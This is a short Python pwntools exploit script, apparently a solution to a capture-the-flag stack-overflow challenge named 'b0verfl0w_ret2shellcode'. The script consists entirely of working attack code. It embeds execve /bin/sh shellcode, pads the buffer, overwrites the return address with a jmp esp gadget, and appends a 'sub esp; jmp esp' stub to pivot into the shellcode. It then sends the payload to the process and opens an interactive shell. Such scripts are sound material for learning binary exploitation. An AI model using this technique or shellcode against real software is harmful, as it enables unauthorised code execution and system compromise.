from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./b0verfl0w_ret2shellcode"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("127.0.0.1",4000)

elf = ELF(binary)
# libc = ELF(libc_binary)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = flat([
    shellcode,"p"*(0x20-len(shellcode)),"bbbb",jmp_esp,sub_esp_jmp
])
# gdb.attach(p,"b *0x08048575")
p.sendlineafter("What's your name?\n",payload)

p.interactive()
